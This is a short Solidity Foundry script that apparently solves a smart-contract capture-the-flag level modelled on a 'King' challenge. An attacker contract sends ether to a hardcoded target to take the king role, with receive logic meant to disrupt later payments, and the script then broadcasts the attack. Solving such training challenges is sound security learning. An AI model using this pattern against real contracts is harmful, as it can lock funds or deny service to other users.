// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Hack {
  address immutable target;
  bool firstReceive = true;

  constructor(address _target) {
    target = _target;
  }

  function hack() public payable {
    (bool success, ) = address(target).call{value: msg.value}("");
    console.log("Success of hack()", success);
  }

  receive() external payable {
    if (!firstReceive) {
      address(msg.sender).call{value: msg.value}("");
    }
    firstReceive = false;
  }
}

contract Solve is Script, Test {
  address target = payable(0x3B7B66bc8988158e5aB6672E0C8b86f671aF9938);
  using stdStorage for StdStorage;

  function run() public {
    vm.startBroadcast();

    Hack h = new Hack(target);
    console.log("Address of Hack is %s", address(h));
    h.hack{value: 0.001 ether}();

    (, bytes memory data) = target.call(abi.encodeWithSignature("_king()"));
    address king = abi.decode(data, (address));
    console.log("King is %s", king);

    vm.stopBroadcast();
  }
}
